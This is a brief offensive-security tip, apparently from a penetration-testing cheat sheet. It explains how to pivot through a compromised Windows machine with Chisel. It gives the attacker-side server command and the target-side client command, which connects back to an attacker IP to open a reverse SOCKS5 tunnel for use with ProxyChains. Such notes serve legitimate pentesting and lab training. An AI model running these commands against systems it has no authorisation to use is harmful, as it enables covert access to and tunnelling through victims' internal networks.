If you need to proxy traffic over a compromised Windows machine, [Chisel](https://github.com/jpillora/chisel) (or [SharpChisel](https://github.com/shantanu561993/SharpChisel)) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.

On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.

```bash
sudo ./chisel server -p 80 --reverse --socks5
```

Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.

```powershell
.\chisel.exe client 192.168.49.67:80 R:socks
```

A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.
